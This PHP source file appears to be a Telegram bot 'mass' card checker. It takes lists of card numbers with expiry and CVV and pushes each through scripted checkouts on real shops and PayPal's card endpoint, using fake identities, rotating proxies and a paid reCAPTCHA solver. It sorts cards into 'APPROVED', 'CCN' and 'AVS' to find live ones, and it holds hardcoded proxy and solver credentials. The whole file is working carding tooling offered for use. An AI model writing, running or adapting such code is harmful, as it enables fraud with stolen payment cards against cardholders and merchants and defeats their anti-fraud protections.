<?php
use GuzzleHttp\Client;
use GuzzleHttp\Cookie\CookieJar;
use GuzzleHttp\Exception\RequestException;

$cmd = Command($message);
if (strtolower($cmd['command']) == "mass1") {
    $data = $cmd['data'];
    $tiempo_inicial = microtime(true);
    

    deleteprm($userId);
    $NameGater ='mass1';
    $gateway = '/mass1 :'.$NameGater;
    Contador($gateway);
    is_credits();
    deltecred($userId);
    is_gateroff('mass1');


    $Mi_Id = "5977133709";
    if (empty($data)){
        reply_to($chatId, $message_id,$keyboard,'<b>Mass Charged $1%0AFormat: cc|m|y|cvv</b>');
        die();
    }


$antispmatim = antispamCheck($userId);
    if($antispmatim != False ){
       reply_to($chatId,$message_id,$keyboard,"<b>[ANTI SPAM] Try again after $antispmatim</b><b>s</b>.");
        exit();
    }
$antispmatim = antispamCheckperemium($userId);
    if($antispmatim != False ){
       reply_to($chatId,$message_id,$keyboard,"<b>[ANTI SPAM] Try again after $antispmatim</b><b>s</b>.");
        exit();
    }
#Rango 
$nui = infouser($userId);
    $Rank = $nui['apodo'];
if($gId == $Mi_Id){
    $Rank = "Owner";
    $GLOBALS['Rank'] = $Rank;
}elseif($userId == verifiAdmin($userId)){
    $Rank ="Admin";
    $GLOBALS['Rank'] = $Rank;
}elseif($userId == veritimepremium($userId)){
   $Rank = $nui['apodo'];
}elseif($chatId == verifiCharAdmin($chatId)){
    $Rank = "Free User";
    $GLOBALS['Rank'] = $Rank;
}
elseif($userId == verificadroCrdediuser($userId)){
    $Rank ="Free user";
    $GLOBALS['Rank'] =$Rank;
}

#fin 


    $m1 = bot("sendmessage", [
        "chat_id" => $chatId,
        "text" => "<b>Checking status... Please hold on while we verify.</b>",
        "parse_mode" => "html",
        "reply_to_message_id" => $message_id,
    ]);

    $ms1 = capture(json_encode($m1), '"message_id":', ",");

        
    $data = cleansix($data);

    $allcards = multiexplode(["\n", " "], $data);


if (count($allcards) <= 5) {
    $resultados = "";
    $num = 0;
    $index = 0; // Inicializamos el índice para el bucle while

    while ($index < count($allcards)) {
        $card1 = $allcards[$index];
        $num = ++$num;
        
        $me = json_encode(mass1mt($card1));
        $card = json_decode($me, true);
        $status = $card["status"];
    
        if($status == "APPROVED ✅")
        {
            p_rce($userId, "3");
        } 
        
        $message = $card["message"];

        
        $resultados .= "<b>[ϟ] Card:</b> <code>$card1</code>\n" .
              "<b>[ϟ] Status:</b> <code>$status</code>\n" .
              "<b>[ϟ] Result:</b> <code>$message</code>\n";
        $index++;
    }


    $tiempo_final = microtime(true);
    $tiempo = $tiempo_final - $tiempo_inicial;
    $tiempo = substr($tiempo, 0, 4);
    $resultados .= "<b>━━━━━━━━━━━━━━━━
[ϟ] Card Check info: Proxy's: <code>Live ✅</code> 
[ϟ] Time: <code>$tiempo</code> | Gate: <code>$NameGater</code>
[ϟ] Checked by: <a href='tg://user?id=$userId'>$username</a>[<code>$Rank</code>]
━━━━━━━━━━━━━━━━</b>";

    // Actualizar el mensaje
    bot("editMessageText", [
        "chat_id" => $chatId,
        "text" => $resultados,
        "parse_mode" => "html",
        "message_id" => $ms1,
    ]);
} else {
    bot("editMessageText", [
        "chat_id" => $chatId,
        "text" => "Error Maximo",
        "parse_mode" => "html",
        "message_id" => $ms1,
    ]);
    exit();
}
}



/// ----------------------------------------------------------------------------------------


function mass1mt($lista) {

    $separa = explode("|", trim($lista));
    $cc = $separa[0];
    $mes = $separa[1];
    $ano = $separa[2];
    $cvv = $separa[3];

    $maxRetries = 3;
    $retries = 0;
    $client = new Client();
    $cookies = new CookieJar();

    $maxRetries = 3;
    $retries = 0;
    $result = [];


while ($retries < $maxRetries) {

    $socks5 = "all.dc.smartproxy.com:10000";
    $rotate = "Testingthis123:Testingpassword12+";
    $proxy = ['https' => 'http://' . $rotate . '@' . $socks5];
    try {
        $response = $client->request('GET', 'https://randomuser.me/api/?nat=gb');
        $data = json_decode($response->getBody(), true);
        $user = $data["results"][0];
        $providers = array('gmail.com', 'hotmail.com', 'yahoo.com', 'outlook.com');
        $provider = $providers[array_rand($providers)];
        $email = strtolower($user["name"]["first"])  . strtolower($user["name"]["last"]) . rand(111,33452).'@' . $provider;
        $firstname = $user["name"]["first"];
        $lastname = $user["name"]["last"];


        $res = $client->request('GET', "https://www.fakexy.com/fake-address-generator-us");
        $html = (string) $res->getBody();
        $dom = new DOMDocument;
        @$dom->loadHTML($html);
        $xpath = new DOMXPath($dom);
        $street = $xpath->query('//td[text()="Street"]/following-sibling::td')->item(0)->nodeValue ?? "none";
        $city = $xpath->query('//td[text()="City/Town"]/following-sibling::td')->item(0)->nodeValue ?? "none";
        $state = $xpath->query('//td[text()="State/Province/Region"]/following-sibling::td')->item(0)->nodeValue ?? "none";
        $zip = $xpath->query('//td[text()="Zip/Postal Code"]/following-sibling::td')->item(0)->nodeValue ?? "none";
        $phone = $xpath->query('//td[text()="Phone Number"]/following-sibling::td')->item(0)->nodeValue ?? "none";
        $country = $xpath->query('//td[text()="Country"]/following-sibling::td')->item(0)->nodeValue ?? "none";

        $password = substr(str_shuffle('abcdefMNOPQ56789_!'), 0, 12);

        $stateAb = ["Alabama" => "AL","Alaska" => "AK","Arizona" => "AZ","Arkansas" => "AR","California" => "CA","Colorado" => "CO","Connecticut" => "CT","Delaware" => "DE","District of Columbia" => "DC","Florida" => "FL","Georgia" => "GA","Hawaii" => "HI","Idaho" => "ID","Illinois" => "IL","Indiana" => "IN","Iowa" => "IA","Kansas" => "KS","Kentucky" => "KY","Louisiana" => "LA","Maine" => "ME","Maryland" => "MD","Massachusetts" => "MA","Michigan" => "MI","Minnesota" => "MN","Mississippi" => "MS","Missouri" => "MO","Montana" => "MT","Nebraska" => "NE","Nevada" => "NV","New Hampshire" => "NH","New Jersey" => "NJ","New Mexico" => "NM","New York" => "NY","North Carolina" => "NC","North Dakota" => "ND","Ohio" => "OH","Oklahoma" => "OK","Oregon" => "OR","Pennsylvania" => "PA","Rhode Island" => "RI","South Carolina" => "SC","South Dakota" => "SD","Tennessee" => "TN","Texas" => "TX","Utah" => "UT","Vermont" => "VT","Virginia" => "VA","Washington" => "WA","West Virginia" => "WV","Wisconsin" => "WI","Wyoming" => "WY",];
        $regioncode = $stateAb["$state"];


        $request = $client->request('POST', 'https://sourcing.cn.com/wp-admin/admin-ajax.php', [
            'body' => 'attribute_colour=Baby+white+%5Bbuilt-in+battery%5D&quantity=1&add-to-cart=16641&product_id=16641&variation_id=16656&action=woodmart_ajax_add_to_cart',
            'headers' => [
                'accept' => '*/*',
                'accept-language' => 'es-ES,es;q=0.9',
                'content-type' => 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin' => 'https://sourcing.cn.com',
                'referer' => 'https://sourcing.cn.com/product/2023-new-folding-small-fan-portable-creative-neck-mini-fan-handheld-usb-small-fan-charging-model/',
                'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',
                'x-requested-with' => 'XMLHttpRequest',
            ],
            'cookies' => $cookies,
            'proxy' => $proxy,
        ]);

        $request = $client->request('GET', 'https://sourcing.cn.com/checkout/', [
            'headers' => [
                'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'referer' => 'https://sourcing.cn.com/product/2023-new-folding-small-fan-portable-creative-neck-mini-fan-handheld-usb-small-fan-charging-model/',
                'upgrade-insecure-requests' => '1',
                'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',
            ],
            'cookies' => $cookies,
            'proxy' => $proxy,
        ]);

        $nonce = GetStr($request->getBody(), 'wc-ajax=ppc-create-order","nonce":"', '"');
        $nonce2 = GetStr($request->getBody(), '<input type="hidden" id="woocommerce-process-checkout-nonce" name="woocommerce-process-checkout-nonce" value="', '"');
    
        $request = $client->request('POST', 'https://sourcing.cn.com/?wc-ajax=ppc-create-order', [
            'body' => '{"nonce":"'.$nonce.'","payer":null,"bn_code":"Woo_PPCP","context":"checkout","order_id":"0","payment_method":"ppcp-gateway","funding_source":"card","form_encoded":"billing_first_name='.$firstname.'&billing_last_name='.$lastname.'&billing_company=Corp+'.$lastname.'&billing_country=US&billing_address_1='.$street.'&billing_address_2=&billing_city='.$city.'&billing_state='.$regioncode.'&billing_postcode='.$zip.'&billing_phone='.$phone.'&billing_email='.$firstname.'_'.$lastname.'23%40gmail.com&order_comments=&payment_method=ppcp-gateway&mailpoet_woocommerce_checkout_optin_present=1&woocommerce-process-checkout-nonce='.$nonce2.'&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review&ppcp-funding-source=card","createaccount":false,"save_payment_method":false}',
            'headers' => [
                'accept' => '*/*',
                'content-type' => 'application/json',
                'origin' => 'https://sourcing.cn.com',
                'referer' => 'https://sourcing.cn.com/checkout/',
                'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',
            ],
            'cookies' => $cookies,
        ]);

        $id = json_decode($request->getBody(), true)['data']['id'];


        $option =  ["5"=>"MASTER_CARD","6"=> "DISCOVER", "4"=>"VISA","3"=> "AMEX", "34"=>"DINERS"];
        $type11 = $option[substr($cc ,0,1)];

        $request = $client->request('POST', 'https://www.paypal.com/graphql?fetch_credit_form_submit', [
        'body' => '{"query":"\n        mutation payWithCard(\n            $token: String!\n            $card: CardInput!\n            $phoneNumber: String\n            $firstName: String\n            $lastName: String\n            $shippingAddress: AddressInput\n            $billingAddress: AddressInput\n            $email: String\n            $currencyConversionType: CheckoutCurrencyConversionType\n            $installmentTerm: Int\n            $identityDocument: IdentityDocumentInput\n        ) {\n            approveGuestPaymentWithCreditCard(\n                token: $token\n                card: $card\n                phoneNumber: $phoneNumber\n                firstName: $firstName\n                lastName: $lastName\n                email: $email\n                shippingAddress: $shippingAddress\n                billingAddress: $billingAddress\n                currencyConversionType: $currencyConversionType\n                installmentTerm: $installmentTerm\n                identityDocument: $identityDocument\n            ) {\n                flags {\n                    is3DSecureRequired\n                }\n                cart {\n                    intent\n                    cartId\n                    buyer {\n                        userId\n                        auth {\n                            accessToken\n                        }\n                    }\n                    returnUrl {\n                        href\n                    }\n                }\n                paymentContingencies {\n                    threeDomainSecure {\n                        status\n                        method\n                        redirectUrl {\n                            href\n                        }\n                        parameter\n                    }\n                }\n            }\n        }\n        ","variables":{"token":"'.$id.'","card":{"cardNumber":"'.$cc.'","type":"'.$type11.'","expirationDate":"'.$mes.'/'.$ano.'","postalCode":"'.$zip.'","securityCode":"232"},"firstName":"'.$firstname.'","lastName":"'.$lastname.'","billingAddress":{"givenName":"'.$firstname.'","familyName":"'.$lastname.'","line1":"'.$street.'","line2":null,"city":"'.$city.'","state":"'.$regioncode.'","postalCode":"'.$zip.'","country":"US"},"email":"'.$firstname.'_'.$lastname.'23@gmail.com","currencyConversionType":"PAYPAL"},"operationName":null}',
            'headers' => [
                'accept' => '*/*',
                'content-type' => 'application/json',
                'origin' => 'https://www.paypal.com',
                'paypal-client-context' => $id,
                'paypal-client-metadata-id' => $id,
                'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',
                'x-app-name' => 'standardcardfields',
                'x-country' => 'US',
            ],
            'cookies' => $cookies,
        ]);

        $error = json_decode($request->getBody(), true)['errors'][0]['data'][0]['code'];

        if (strpos($request->getBody(), 'is3DSecureRequired') !== false) {
            $status = 'APPROVED✅';
            $response = 'Charged $0.10✅';
        } elseif ($error == 'INVALID_SECURITY_CODE') {
            $status = 'CCN✅';
            $response = $error;
        } elseif ($error == 'INVALID_BILLING_ADDRESS') {
            $status = 'AVS✅';
            $response = $error;
        } elseif ($error == 'EXISTING_ACCOUNT_RESTRICTED') {
            $status = 'APPROVED✅';
            $response = $error;
        } else {
            $status = 'DECLINED❌';
            $response = $error;
        }
        
        break;
    } catch (RequestException $e) {
        $retries++;
        if ($retries >= $maxRetries) {
            $status = "ERROR #BOT_ERROR ❌";
            $response = "Error: Maximum attempts reached. (3/3)";
            return [
                'status' => $status,
                'message' => $response,
                'retries' => $retries,
            ];            
        }
    }
}
$result = [
    'status' => $status,
    'message' => $response,
    'retries' => $retries
];
return $result;
}



//Remplazo por si muere Arturito

function mass1mc($lista) {
    $maxRetries = 3;
    $retries = 0;
    $curl = new CurlX;
    $cookie = uniqid();
    $solver = new \Capsolver\CapsolverClient('CAP-5361C0C774F336BECC410D69E869566E');


    $separa = explode("|", trim($lista));
    $cc = $separa[0];
    $mes = $separa[1];
    $ano = $separa[2];
    $cvv = $separa[3];

    if ($mes < 10) {
        $mes = substr($mes, -1);
    }

    if(strlen($ano) == 2){
        $ano = "20".$ano;
    }

    $result = [];

    while ($retries < $maxRetries) {

        try { 
            
            $json = file_get_contents("https://randomuser.me/api/?nat=us");
            $data = json_decode($json, true);
            $user = $data["results"][0];
            $providers = array('gmail.com', 'hotmail.com', 'yahoo.com', 'outlook.com');
            $provider = $providers[array_rand($providers)];
            $email = strtolower($user["name"]["first"])  . strtolower($user["name"]["last"]) .rand(111,99999). '@' . $provider;
            $firstname = $user["name"]["first"];
            $lastname = $user["name"]["last"];
            $street = $user["location"]["street"]["name"] . ' ' . $user["location"]["street"]["number"];
            $state = $user["location"]["state"];
            $city = $user["location"]["city"];
            $phone = $user["phone"];
            $zip = $user["location"]["postcode"];


            $server = ["METHOD" => "CUSTOM", "SERVER" => 'all.dc.smartproxy.com:10000', "AUTH" => 'Testingthis123:Testingpassword12+'];

            $request = $curl::Post('https://www.armynavyshop.com/mm5/merchant.mvc?Screen=BASK&v=948195', 'Old_Screen=PROD&Old_Search=&Action=ADPR&Store_Code=army-navy-shop&Product_Code=rc4575&Category_Code=camping-chairs-folding-chairs&Offset=&AllOffset=&CatListingOffset=&RelatedOffset=&SearchOffset=&Product_Attribute_Count=0&Quantity=1', [
                'Accept: */*',
                'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
                'Origin: https://www.armynavyshop.com',
                'Referer: https://www.armynavyshop.com/prods/rc4575.html',
                'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',
                'X-Requested-With: XMLHttpRequest',
            ], $cookie, $server);
            if (!$request->success) {
                throw new Exception("Connection error on request. Please try again.");
            }
            
            $solution = $solver->recaptchaV2(
                \Capsolver\Solvers\Token\ReCaptchaV2::TASK_PROXYLESS,
                [
                  'websiteURL'    => 'https://www.armynavyshop.com/',
                  'websiteKey'    => '6Ld_QhsTAAAAAPXBnm5lq6WFEbS-R7LaJ7sPUCyy',
                  
                ]
             );

            $request = $curl::Get('https://www.armynavyshop.com/mm5/merchant.mvc?Screen=OINF', [
                'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'Referer: https://www.armynavyshop.com/prods/rc4575.html',
                'Upgrade-Insecure-Requests: 1',
                'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',
            ], $cookie, $server);
            if (!$request->success) {
                throw new Exception("Connection error on request. Please try again.");
            }

            $request = $curl::Get('https://www.armynavyshop.com/mm5/merchant.mvc?Store_Code=army-navy-shop&Screen=OCST', [
                'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'Accept-Language: es-ES,es;q=0.9',
                'Connection: keep-alive',
                'Referer: https://www.armynavyshop.com/mm5/merchant.mvc?Screen=OINF',
                'Upgrade-Insecure-Requests: 1',
                'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',
                'sec-ch-ua: "Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
                'sec-ch-ua-mobile: ?0',
                'sec-ch-ua-platform: "Windows"'
            ], $cookie, $server);
            if (!$request->success) {
                throw new Exception("Connection error on request. Please try again.");
            }

            $request = $curl::Post('https://www.armynavyshop.com/mm5/merchant.mvc?', 'Action=ORDR&Screen=OUSL&Store_Code=army-navy-shop&ShipFirstName='.$firstname.'&ShipLastName='.$lastname.'&ShipEmail='.urlencode($email).'&ShipPhone='.urlencode($phone).'&ShipFax=&ShipCompany=Corp+'.$lastname.'&ShipAddress1='.urlencode($street).'&ShipAddress2=&ShipCity=Olympia&ShipStateSelect=WA&ShipState=Washington&ShipZip=98501&ShipCountry=US&billing_to_show=1&BillFirstName='.$firstname.'&BillLastName='.$lastname.'&BillEmail='.urlencode($email).'&BillPhone='.urlencode($phone).'&BillFax=&BillCompany=Corp+'.$lastname.'&BillAddress1='.urlencode($street).'&BillAddress2=&BillCity=Olympia&BillStateSelect=WA&BillState=Washington&BillZip=98501&BillCountry=US&order_notes=&CustomerCreate=', [
                'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'Accept-Language: es-ES,es;q=0.9',
                'Cache-Control: max-age=0',
                'Connection: keep-alive',
                'Content-Type: application/x-www-form-urlencoded',
                'Origin: https://www.armynavyshop.com',
                'Referer: https://www.armynavyshop.com/mm5/merchant.mvc?Store_Code=army-navy-shop&Screen=OCST',
                'Upgrade-Insecure-Requests: 1',
                'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36'
            ], $cookie, $server);
            if (!$request->success) {
                throw new Exception("Connection error on request. Please try again.");
            }

            $ShippingMethod = $curl::ParseString($request->body, 'name="ShippingMethod" value="', '"');
            if ($ShippingMethod == "null") {
                throw new Exception("There was an issue capturing the token. Please try again");
            }

            $brd = array('5'=>'paypaladv:MASTERCARD','4'=>'paypaladv:VISA','3'=>'paypaladv:AMEX','6'=>'paypaladv:DISCOVER');
            $PaymentMethod = $brd[substr($cc, 0,1)];

            $request = $curl::Post('https://www.armynavyshop.com/mm5/merchant.mvc?', 'Screen=OPAY&Action=SHIP%2CPSHP%2CCTAX&Store_Code=army-navy-shop&ShippingMethod='.urlencode($ShippingMethod).'&PaymentMethod='.urlencode($PaymentMethod).'', [
                'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'Content-Type: application/x-www-form-urlencoded',
                'Origin: https://www.armynavyshop.com',
                'Referer: https://www.armynavyshop.com/mm5/merchant.mvc?',
                'Upgrade-Insecure-Requests: 1',
                'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36'
            ], $cookie, $server);
            if (!$request->success) {
                throw new Exception("Connection error on request. Please try again.");
            }


            $PaymentAuthorizationToken = $curl::ParseString($request->body, '<input type="hidden" name="PaymentAuthorizationToken" value="', '"');
            if ($PaymentAuthorizationToken == "null") {
                throw new Exception("There was an issue capturing the token. Please try again");
            }


            $brd = array('5'=>'MasterCard','4'=>'Visa','3'=>'American%20Express','6'=>'Discover');

            $PaymentDescription = $brd[substr($cc, 0,1)];

              
            $captcha = $solution["gRecaptchaResponse"];
            $request = $curl::Post('https://www.armynavyshop.com/mm5/merchant.mvc?', 'Action=AUTH&Screen=INVC&Store_Code=army-navy-shop&PaymentAuthorizationToken='.$PaymentAuthorizationToken.'&g-recaptcha-response='.$captcha.'&PaymentMethod='.urlencode($PaymentMethod).'&SplitPaymentData=&PaymentDescription='.$PaymentDescription.'&PayPalAdv_CardNumber='.$cc.'&PayPalAdv_CardExp_Month='.$mes.'&PayPalAdv_CardExp_Year='.$ano.'&PayPalAdv_CardCvv='.$cvv.'', [
                'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'Content-Type: application/x-www-form-urlencoded',
                'Origin: https://www.armynavyshop.com',
                'Referer: https://www.armynavyshop.com/mm5/merchant.mvc?',
                'Upgrade-Insecure-Requests: 1',
                'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',
            ], $cookie, $server);
            if (!$request->success) {
                throw new Exception("Connection error on request. Please try again.");
            }

            $message = strip_tags(trim($curl::ParseString($request->body, '<p class="message message-error">', '<br />')));


            if (substr_count($request->body, "Unable to authorize payment: CVV2 Mismatch")){
                $status = "APPROVED ✅";
                $response = "CVV2 Mismatch";
            }elseif (substr_count($request->body, "Unable to authorize payment: Declined")){
                $status = "DECLINED❌";
                $response = 'Declined';
            }else{
                $status = "DECLINED❌";
                $response = $message;
            }


            break;
        } catch (Exception $e) {
            $retries++;
            if ($retries >= $maxRetries) {
                $status = "ERROR #BOT ❌";
                $response = $e->getMessage();
                return [
                    'status' => $status,
                    'message' => $response,
                    'retries' => $retries
                ];
            }
        }
    }
    $result = [
        'status' => $status,
        'message' => $response,
        'retries' => $retries
    ];
    return $result;
}

